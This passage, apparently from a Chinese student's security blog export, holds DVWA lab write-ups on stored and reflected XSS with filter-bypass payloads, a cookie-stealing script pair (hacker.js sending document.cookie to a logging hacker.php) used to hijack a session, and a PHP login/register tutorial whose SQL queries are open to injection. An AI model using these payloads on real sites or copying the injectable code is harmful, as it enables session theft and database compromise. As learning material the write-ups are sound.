does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); &#x2F;&#x2F; Update database $query &#x3D; &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; ); &#x2F;&#x2F;mysql_close();&#125;?&gt; 发现了一些函数： trim(string,charlist) 函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\\t、\\n、\\x0B、\\r以及空格，可选参数charlist支持添加额外需要删除的字符。 mysql_real_escape_string(string,connection) 函数会对字符串中的特殊符号（\\x00，\\n，\\r，\\，‘，“，\\x1a）进行转义。 stripslashes(string) 函数删除字符串中的反斜杠。 可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在我们可以利用的存储型XSS漏洞。 想做一波进一步的利用，但是发现message对字符值有限制。 想通过burp试一下，将message里的内容改为我们的恶意XSS代码 发包！！！现在我们的代码已经存储在数据库里了！ 我们按正常信息输入，去我文件夹里的cookie查看，刚刚的cookie已经成功传入到我的文件里了(可以干啥上篇文章已经说类)！！！ 实战总比理论有意思！ 等级为：medium还是原始的payload少了&lt;script&gt;应该&lt;script&gt;还是被过滤掉了！！ 大小写绕过,双写绕过也不行。 那就尝试下burp改一下试试。 Name和Message里只有Name可以通过双写绕过，Message却不行。 查看源码： 123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123; &#x2F;&#x2F; Get input $message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] ); $name &#x3D; trim( $_POST[ &#39;txtName&#39; ] ); &#x2F;&#x2F; Sanitize message input $message &#x3D; strip_tags( addslashes( $message ) ); $message &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message &#x3D; htmlspecialchars( $message ); &#x2F;&#x2F; Sanitize name input $name &#x3D; str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name ); $name &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); &#x2F;&#x2F; Update database $query &#x3D; &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; ); &#x2F;&#x2F;mysql_close();&#125;?&gt; 从源码里可以可以看到，message一栏经过严格的过滤，而且还经过htmlspecialchars()函数的处理，很难从message下手。 但是name一栏只是简单的用trim()函数,str_place()函数处理，可以通过双写绕过。 等级为：high结果：message，name一栏可能经过严格的过滤，但是我们可以使用img、iframe等其它的标签！！！ payload：&lt;img src=1 onerror=alert(/XSS/)&gt; 我们通过抓包更改name试一下。 也成功了！ 看一下源码： 123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123; &#x2F;&#x2F; Get input $message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] ); $name &#x3D; trim( $_POST[ &#39;txtName&#39; ] ); &#x2F;&#x2F; Sanitize message input $message &#x3D; strip_tags( addslashes( $message ) ); $message &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message &#x3D; htmlspecialchars( $message ); &#x2F;&#x2F; Sanitize name input $name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $name ); $name &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); &#x2F;&#x2F; Update database $query &#x3D; &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; ); &#x2F;&#x2F;mysql_close();&#125;?&gt; name栏的正则匹配，message栏的htmlspecialchars( )函数，俩栏都使用了很多的过滤方法！ XSS(存储型)结束了,下一篇DOM型XSS","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"XSS学习","slug":"XSS学习","permalink":"https://qidian-png.github.io/tags/XSS%E5%AD%A6%E4%B9%A0/"}]},{"title":"XSS基础及实战(XSS提取cookie并登录)","slug":"XSS基础及实战(XSS提取cookie并登录的)","date":"2020-09-06T14:12:55.000Z","updated":"2020-09-10T08:12:35.565Z","comments":true,"path":"2020/09/06/XSS基础及实战(XSS提取cookie并登录的)/","link":"","permalink":"https://qidian-png.github.io/2020/09/06/XSS%E5%9F%BA%E7%A1%80%E5%8F%8A%E5%AE%9E%E6%88%98(XSS%E6%8F%90%E5%8F%96cookie%E5%B9%B6%E7%99%BB%E5%BD%95%E7%9A%84)/","excerpt":"","text":"该学新知识了！本篇文章篇幅有点长，做了很多的本地攻击演示！请耐心观看。 @TOC XSS基础XSS的定义：XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 XSS分类XSS有三类：反射型XSS(非持久型)、存储型XSS(持久型)和DOM XSS。 反射型XSS(非持久型XSS)，攻击方式具有一次性。 攻击方式：攻击者通过包含XSS代码的恶意链接发送给受害者，当受害者访问该连接时，服务器接收该受害者用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给受害者用户的浏览器，浏览器解析这段包含XSS代码的恶意脚本，就会触发XSS漏洞然后完成攻击。 持久型xss攻击：持久型xss，会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。 攻击方式：多见与论坛，博客以及网站留言板。攻击者通过发帖，留言的方式，将恶意XSS脚本连同正常信息通过留言板提交到服务器内并被服务器存储下来，恶意XSS脚本也将保存在服务器中，当其他用户浏览帖子或者留言时，恶意XSS脚本会在他们的浏览器中执行。 DOM跨站（DOM XSS）：DOM（document object model文档对象模型），客户端脚本处理逻辑导致的安全问题。 DOM型XSS是一种特殊类型的反射型XSS，基于DOM文档对象模型的一种漏洞。DOM XSS和反射型XSS、存储型XSS的差别在于DOM XSS的代码并不需要服务器参与，触发XSS靠的是浏览器端的DOM解析，完全是客户端的事情。在整个攻击过程中，服务器响应的页面并没有发生变化，引起客户端脚本执行结果差异的原因是对本地DOM的恶意篡改利用。 反射型XSS的利用演示一（基于DoraBOX靶场）一个正常的输入框，我们可以将自己的xss代码写在提交框里。 数据没有插入到后台，浏览器会把我插入的内容，当作可执行代码给我们返回来。 演示二(基于DVWA靶场)登录的时候，没想起来账号，密码！但是有万能的 DVWA默认的用户有5个，用户名密码如下（一个足以）： 123456789admin&#x2F;passwordgordonb&#x2F;abc1231337&#x2F;charleypablo&#x2F;letmeinsmithy&#x2F;password 登录进去，选择反射型XSS。 等级为：impossible选择一个简单的payload：&lt;script&gt;alert(/xss/)&lt;/script&gt; 输入任何xss代码，正常的输出，不会弹出我们想要的界面，这也让我很懵逼。 无奈查看了源码 12345678910111213141516&lt;?php&#x2F;&#x2F; Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123; &#x2F;&#x2F; Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); &#x2F;&#x2F; Get input $name &#x3D; htmlspecialchars( $_GET[ &#39;name&#39; ] ); &#x2F;&#x2F; Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;&#125;&#x2F;&#x2F; Generate Anti-CSRF tokengenerateSessionToken(); 发现了 htmlspecialchars() 函数，其主要作用就是把一些预定义的字符转换为 HTML 实体。 预定义的字符是： 12345&amp; （和号） 成为 &amp;&quot; （双引号） 成为 &quot;&#39; （单引号） 成为 &amp;apos;&lt; （小于） 成为 &lt;&gt; （大于） 成为 &gt; 我说怎么输入，都不会弹窗，而是直接输出，我输入的xss代码，经过htmlspecialchars() 函数的转换，被转换成非HTML可执行代码，所以impossible等级不存在XSS漏洞。 等级为：low简单的演示构造payload:&lt;script&gt;alert(/xss/)&lt;/script&gt; 弹窗成功！ 查看源码： 1234567891011&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);&#x2F;&#x2F; Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123; &#x2F;&#x2F; Feedback for end user echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;&#x2F;pre&gt;&#39;;&#125;?&gt; 以get方式传参，没有经过任何过滤，很明显存在XSS漏洞。 本地利用XSS获取cookie工欲善其事，必先利其器。 直接上我们的工具！！！ hacker.js 123var img &#x3D; new Image();img.src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA&#x2F;vulnerabilities&#x2F;xss_r&#x2F;hacker.php?x&#x3D;&quot; + document.cookie;document.body.append(img); hacker.php 12345678&lt;?php$cookie &#x3D; $_GET[&#39;x&#39;];$ip &#x3D; getenv (&#39;REMOTE_ADDR&#39;);$time &#x3D; date(&#39;Y-m-d g:i:s&#39;);$fp &#x3D; fopen(&quot;cookie.txt&quot;,&quot;a&quot;);fwrite($fp,&quot;IP: &quot;.$ip.&quot;Date: &quot;.$time.&quot; Cookie:&quot;.$cookie.&quot;\\n&quot;);fclose($fp);?&gt; 构造我们的payload：http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=&lt;script src=&quot;http://127.0.0.1/DVWA/vulnerabilities/xss_r/hacker.js&quot; /&gt;&lt;/script&gt; 将我们的URL发给另外一个用户，他点了一下。并且输入自己的姓名。 他输入之后，我们这边就生成了一个cookie.txt文件，我们打开看一下 他的IP，登陆地址，还有cookie已经在我们这边了。 😉既然拿到了cookie，下面我们应该改怎么办？？？ 演示一下：我们来到DVWA的登陆界面，F12打开页面，找到cookie 我们新建或者编辑一个cookie内容就是我们刚刚得到的cookie，刷新一下页面。 登陆成功喽！这是简单的通过XSS漏洞获得cookie，并且登录 等级为：medium按照上个payload输入，发现了一点东西， 我们的&lt;script&gt;没有了，猜想可能被替代掉了。 我们换种payload:&lt;SCript&gt;alert(/XSS/)&lt;/SCript&gt; 这可能是黑名单过滤！ 看一下源码： 123456789101112&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);&#x2F;&#x2F; Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123; &#x2F;&#x2F; Get input $name &#x3D; str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); &#x2F;&#x2F; Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;&#125; 发现了str_replace()函数 123456str_replace(find,replace,string,count)find 必需。规定要查找的值。replace 必需。规定替换 find 中的值的值。string 必需。规定被搜索的字符串。count 可选。对替换数进行计数的变量。 我们传入的name,将会经过str_replace()函数处理，查看name内是否有&lt;script&gt;,有则把&lt;script&gt;替换成 空格。这应该就是简单的黑名单过滤吧！ 对于str_replace()函数我们也可以通过双写绕过&lt;scr&lt;script&gt;ipt&gt;alert(/xss/);&lt;/script&gt; 也可以使用非 script 标签的 xss payload绕过 img标签： 1&lt;img src&#x3D;1 onerror&#x3D;alert(&#39;xss&#39;)&gt; iframe标签： 1&lt;iframe onload&#x3D;alert(1)&gt; 等级为：High输入payload，页面只剩下这个符号：&gt;猜想是不是把我们输入的&lt;script&gt;alert(/XSS/)&lt;/script&gt;全部过滤，只剩下&gt;,可能还是黑名单过滤，但可能比之前更高级。 既然是黑名单过滤，那我们就使用非script的标签绕过，payload:&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt; 当然也可以使用iframe标签绕过！！！ XSS反射型的介绍和利用就先到这结束，本来想把存储型和DOM型一起写了，但无奈篇幅太长影响阅读！！！稍后补上！ 顺便说句开学快乐！！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"XSS学习","slug":"XSS学习","permalink":"https://qidian-png.github.io/tags/XSS%E5%AD%A6%E4%B9%A0/"}]},{"title":"html+css+php+mysql简单的页面登陆与注册(数据库的交互)","slug":"html+css+php+mysql 简单的页面登录与注册(数据库的交互)","date":"2020-09-03T07:30:44.000Z","updated":"2020-09-03T07:37:10.099Z","comments":true,"path":"2020/09/03/html+css+php+mysql 简单的页面登录与注册(数据库的交互)/","link":"","permalink":"https://qidian-png.github.io/2020/09/03/html+css+php+mysql%20%E7%AE%80%E5%8D%95%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%99%BB%E5%BD%95%E4%B8%8E%E6%B3%A8%E5%86%8C(%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BA%A4%E4%BA%92)/","excerpt":"","text":"这是一个简单的小项目，但对于我这小白来说，也是写了好几天才完成，中间心态炸裂n次，但最后还是 搞定了！！！ 说了那麽多，还是分享一下吧！ @TOC 实验环境是phpstudy2018。 在phpstudy的www目录里，创建一个新文件夹test。 文件里有： index.php 主页面(登陆页面)login.php 登录页面的后台操作register.html 注册页面register.php 注册页面的后台操作 主页面(登录页面)先上图 有点简单了。 下面是源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;&lt;head&gt;&lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;&lt;title&gt;&lt;&#x2F;title&gt;&lt;meta name&#x3D;&quot;keywords&quot; content&#x3D;&quot;&quot; &#x2F;&gt;&lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot; &#x2F;&gt;&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;body &#123; background-size: cover; min-width: 1000px; background-image:url(https:&#x2F;&#x2F;s1.ax1x.com&#x2F;2020&#x2F;08&#x2F;23&#x2F;d0t8ln.jpg); font-size:14px;&#125;#main &#123; width:360px; height:320px; background:#fff; border:1px solid #ddd; position:absolute; top:50%; left:50%; margin-left:-180px; margin-top:-160px; background-size: cover; background-image:url(https:&#x2F;&#x2F;s1.ax1x.com&#x2F;2020&#x2F;07&#x2F;31&#x2F;alzGMn.jpg);&#125;#main .title &#123; height: 48px; line-height: 48px; color:#333; font-size:16px; font-weight:bold; text-indent:30px; border-bottom:1px dashed #eee; &#125;#main form &#123; width:300px; margin:20px 0 0 40px;&#125;#main form label &#123; margin:20px 0 0 40px; display:block;&#125;#main form label input.text &#123; width:200px; height:25px;&#125;#main form label input.submit &#123; width:200px; display:block; height:35px; cursor:pointer; margin:20px 0 0 2px;&#125;&lt;&#x2F;style&gt;&lt;&#x2F;head&gt;&lt;body&gt; &lt;div id&#x3D;&quot;main&quot;&gt; &lt;div class&#x3D;&quot;title&quot;&gt;欢迎使用，请登录&lt;&#x2F;div&gt; &lt;form action&#x3D;&quot;login.php&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return enter()&quot;&gt; &lt;label&gt;&lt;input class&#x3D;&quot;text&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;用户名&quot; name&#x3D;&quot;username&quot; &#x2F;&gt;&lt;&#x2F;label&gt; &lt;label&gt;&lt;input class&#x3D;&quot;text&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;密码&quot; name&#x3D;&quot;password&quot; &#x2F;&gt;&lt;&#x2F;label&gt; &lt;label&gt;&lt;input class&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;登录&quot; &#x2F;&gt;&lt;&#x2F;label&gt; &lt;a href&#x3D;&quot;register.html&quot; target&#x3D;&quot;_self&quot; style&#x3D;&quot;position: absolute; bottom: 10px; right: 10px;&quot;&gt;没有账号，先注册&lt;&#x2F;a&gt; &lt;&#x2F;form&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 主要就是对登录页面的背景，颜色，登录框背景，颜色，字体大小等等的设置，这也没啥技术含量，都是html知识的简单运用，我就不多说了。 登录页面的后台操作直接上源码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phperror_reporting(0);&#x2F;&#x2F;第一次登陆的时候，通过用户输入的信息来确认用户 if ( (($_POST[&#39;username&#39;]))!&#x3D;NULL &amp;&amp; (($_POST[&#39;password&#39;])!&#x3D;NULL)) &#123; $userName &#x3D; $_POST[&#39;username&#39;]; $password &#x3D; $_POST[&#39;password&#39;]; &#x2F;&#x2F;从db获取用户信息 &#x2F;&#x2F;PS：数据库连接信息改成自己的 分别为主机 数据库用户名 密码 $conn &#x3D; mysqli_connect(&#39;localhost:3306&#39;,&#39;root&#39;,&#39;root&#39;); mysqli_select_db($conn,&#39;test&#39;); $sql &#x3D; &quot;select username,password from user where username &#x3D; &#39;$userName&#39; and password&#x3D;&#39;$password&#39;&quot;; $res &#x3D; mysqli_query($conn,$sql); $row &#x3D; mysqli_fetch_array($res); if ($row[&#39;username&#39;]!&#x3D;$userName) &#123; echo &#39;不能登陆!&#39;; header(&#39;Location:index.html&#39;); &#125; else if($row[&#39;username&#39;]&#x3D;&#x3D;$userName&amp;&amp;$row[&#39;password&#39;]!&#x3D;$password) &#123; echo &#39;不能登陆!!&#39;; header(&#39;Location:index.html&#39;); &#125; else if($row[&#39;username&#39;]!&#x3D;$userName&amp;&amp;$row[&#39;password&#39;]!&#x3D;$password) &#123; echo &#39;不能登陆!!!&#39;; header(&#39;Location:index.html&#39;); &#125; else if($row[&#39;username&#39;]&#x3D;&#x3D;$userName&amp;&amp;$row[&#39;password&#39;] &#x3D;&#x3D;$password) &#123; &#x2F;&#x2F;如果密码验证通过，设置一个cookies，把用户名保存在客户端 setcookie(&#39;username&#39;,$userName,time()+3600);&#x2F;&#x2F;设置一个小时 &#x2F;&#x2F;最后跳转到登录后的欢迎页面 &#x2F;*echo &#39;登陆成功!&#39;; header(&#39;Location:https:&#x2F;&#x2F;y.qq.com&#x2F;n&#x2F;yqq&#x2F;mv&#x2F;v&#x2F;o0013f4q6uz.html&#39;);&#x2F;&#x2F;跳转到最后的欢迎页面*&#x2F; echo &quot;&lt;script&gt;alert(&#39;登陆成功！！&#39;);location.href&#x3D;&#39;https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1qK_KopZzMZIKfT7jkZ1FVQ&#39;;&lt;&#x2F;script&gt;&quot;; &#125; &#125; else &#123; echo &#39;登陆失败&#39;; header(&#39;Location:index.html&#39;);&#x2F;&#x2F;跳转到失败页面 &#125; if ( (($_COOKIE[&#39;username&#39;]) !&#x3D; null) &amp;&amp; (($_COOKIE[&#39;password&#39;]) !&#x3D; null) ) &#123; $userName &#x3D; $_COOKIE[&#39;username&#39;]; $password &#x3D; $_COOKIE[&#39;password&#39;]; &#x2F;&#x2F;从db获取用户信息 &#x2F;&#x2F;PS：数据库连接信息改成自己的 分别为主机 数据库用户名 密码 $conn &#x3D; mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;password&#39;,&#39;test&#39;); $res &#x3D; mysqli_query($conn,&quot;select * from user where username &#x3D; &#39;$userName&#39; &quot;); $row &#x3D; mysqli_fetch_assoc($res); if ($row[&#39;password&#39;] &#x3D;&#x3D; $password) &#123; &#x2F;&#x2F;验证通过后跳转到登录后的欢迎页面 header(&#39;Location: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1qK_KopZzMZIKfT7jkZ1FVQ&#39; . &quot;?username&#x3D;$userName&quot;); &#125;&#125;else &#123; echo &quot;&lt;script&gt;alert(&#39;用户名或密码错误&#39;);location.href&#x3D;&#39;index.html&#39;;&lt;&#x2F;script&gt;&quot;;&#125;?&gt; 代码开头的error_reporting(0);是为了关闭错误报告，如果没有error_reporting(0) 那么$userName = $_POST[&#39;username&#39;];会报错。 还有就是sql语句的构造，我构造了n次才正常运行，到这个才能与数据库的账号，密码比对。 然后就是你输入账号，密码与数据库里已有比对，来判断你是否可以登录。 如果比对正确，那么就会先存一个时间为一小时的cookie，然后跳转到登录成功页面，我在这放了一个百度云盘链接，登陆成功可以直接访问。 1cookie就是将你的信息存储在本地，下次登录到同样的页面，直接读取cookie里的信息，方便下次访问。 登录成功是一段哲理视频。 注册页面从登录页面里，选择注册跳转到注册页面。 注册页面太简单了，本来想弄个二次密码验证和验证码注册验证，但因为是本地搭建，也没有人恶意攻击我们，就不需要了。 源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;&lt;head&gt;&lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;&lt;title&gt;&lt;&#x2F;title&gt;&lt;meta name&#x3D;&quot;keywords&quot; content&#x3D;&quot;&quot; &#x2F;&gt;&lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot; &#x2F;&gt;&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;body &#123; min-width: 500px; background-image:url(https:&#x2F;&#x2F;s1.ax1x.com&#x2F;2020&#x2F;07&#x2F;31&#x2F;alz3xs.jpg); font-size:14px;&#125;#main &#123; width:360px; height:320px; background:#fff; border:1px solid #ddd; position:absolute; top:50%; left:50%; margin-left:-180px; margin-top:-160px; background-size: cover; background-image:url(https:&#x2F;&#x2F;s1.ax1x.com&#x2F;2020&#x2F;07&#x2F;31&#x2F;alzGMn.jpg);&#125;#main .title &#123; height: 48px; line-height: 48px; color:#333; font-size:16px; font-weight:bold; text-indent:30px; border-bottom:1px dashed #eee; &#125;#main form &#123; width:300px; margin:20px 0 0 40px;&#125;#main form label &#123; margin:20px 0 0 40px; display:block;&#125;#main form label input.text &#123; width:200px; height:25px;&#125;#main form label input.submit &#123; width:200px; display:block; height:35px; cursor:pointer; margin:20px 0 0 2px;&#125;error_reporting(0);&lt;&#x2F;style&gt;&lt;&#x2F;head&gt;&lt;body&gt; &lt;div id&#x3D;&quot;main&quot;&gt; &lt;div class&#x3D;&quot;title&quot;&gt;注册&lt;&#x2F;div&gt; &lt;form action&#x3D;&quot;register.php&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return enter()&quot;&gt; &lt;label&gt;&lt;input class&#x3D;&quot;text&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;用户名&quot; name&#x3D;&quot;username&quot; &#x2F;&gt;&lt;&#x2F;label&gt; &lt;label&gt;&lt;input class&#x3D;&quot;text&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;密码&quot; name&#x3D;&quot;password&quot; &#x2F;&gt;&lt;&#x2F;label&gt; &lt;label&gt;&lt;input class&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;注册&quot; &#x2F;&gt;&lt;&#x2F;label&gt; &lt;&#x2F;form&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 注册页面与登录页面相比，没有做出太大的更改。换了个图片也就没啥了。 注册页面的后台操作源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phperror_reporting(0);$username &#x3D; ($_POST[&#39;username&#39;]);$password &#x3D; trim($_POST[&#39;password&#39;]);$conn &#x3D; mysqli_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;); &#x2F;&#x2F;如果有错误，存在错误号if (mysqli_errno($conn)) &#123; echo mysqli_error($conn); exit;&#125;mysqli_select_db($conn, &#39;test&#39;); &#x2F;&#x2F;选择数据库mysqli_set_charset($conn, &#39;utf8&#39;); &#x2F;&#x2F;选择字符集$sql &#x3D; &quot;insert into user ( username,password) values (&#39;$username&#39;,&#39;$password&#39; )&quot;;$result &#x3D; mysqli_query($conn,$sql);&#x2F;&#x2F;针对user这个数据库进行查询, 查询是否存在有这个用户$row &#x3D; mysqli_num_rows($result);&#x2F;&#x2F;输出查询结果，传给$rowif($_POST[&#39;username&#39;]&#x3D;&#x3D;NULL)&#123; echo &quot;&lt;script&gt;alert(&#39;用户名不能为空&#39;);location.href&#x3D;&#39;register.html&#39;;&lt;&#x2F;script&gt;&quot;;&#125;else if($_POST[&#39;password&#39;]&#x3D;&#x3D; NULL)&#123; echo &quot;&lt;script&gt;alert(&#39;密码不能为空&#39;);location.href&#x3D;&#39;register.html&#39;;&lt;&#x2F;script&gt;&quot;;&#125;else&#123; if($row)&#123; echo &quot;&lt;script&gt;alert(&#39;用户名已存在&#39;);location.href&#x3D;&#39;register.html&#39;;&lt;&#x2F;script&gt;&quot;; &#125;else&#123; $sql1 &#x3D;&quot;insert into user(username,password) values(&#39;&quot;.$username.&quot;&#39;,&#39;&quot; .$password.&quot;&#39;)&quot;;&#x2F;&#x2F;PHP MySQL 插入数据 $result &#x3D; mysqli_query($sql1);&#x2F;&#x2F;判断插入数据是否成功 if($row)&#123; echo &quot;&lt;script&gt;alert(&#39;注册失败！&#39;);location.href&#x3D;&#39;register.html&#39;;&lt;&#x2F;script&gt;&quot;; &#125;else&#123; echo &quot;&lt;script&gt;alert(&#39;注册成功！&#39;);location.href&#x3D;&#39;index.html&#39;;&lt;&#x2F;script&gt;&quot;; &#125; &#125;&#125;mysqli_close($conn);?&gt; 按照流程，先连接数据库，将你的输入的信息传到后台，判断用户名，密码不能为空，再将用户名与数据库对比，若不存在，注册成功，跳转到登陆页面；若已经存在，会报错: 用户名已经存在。 再将你的信息插入到数据库。 最难的也是sql语句的构造，起初是用户名为空，密码却可以正常传入；但是将$usename改为自己的用户名，却可以正常传入。就猜想为用户名传入过程出现了错误，就检查了注册页面的用户名提交方式，发现也没错误。 最终还是回到了register.php页面检查，修修改改才写成现在的语句。 想想太不容易了，心态炸了n次。 与团队内的其他大佬比，我可能写的太简单了，但还是要记录一下！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"暑假练习第六周(二)sql注入-双查询报错注入","slug":"暑假练习第六周(二)SQL注入-双查询报错注入","date":"2020-08-15T11:04:05.000Z","updated":"2020-09-13T11:15:17.944Z","comments":true,"path":"2020/08/15/暑假练习第六周(二)SQL注入-双查询报错注入/","link":"","permalink":"https://qidian-png.github.io/2020/08/15/%E6%9A%91%E5%81%87%E7%BB%83%E4%B9%A0%E7%AC%AC%E5%85%AD%E5%91%A8(%E4%BA%8C)SQL%E6%B3%A8%E5%85%A5-%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","excerpt":"","text":"学习了新内容。 以sql-libs/Less-5为示例。 什么是双查询注入呢？ 看大佬的解释太深奥，粗俗的理解就是一个select语句里再嵌套一个select语句，将有用的信息显示在SQL的报错信息。 首先,理解四个函数/语句：Concat(),Rand(), Floor(), Count(),Group by clause ①concat（）函数 我理解为组合，汇合函数将括号里的符号连接在一起。 将结果连在了一起。②Rand函数 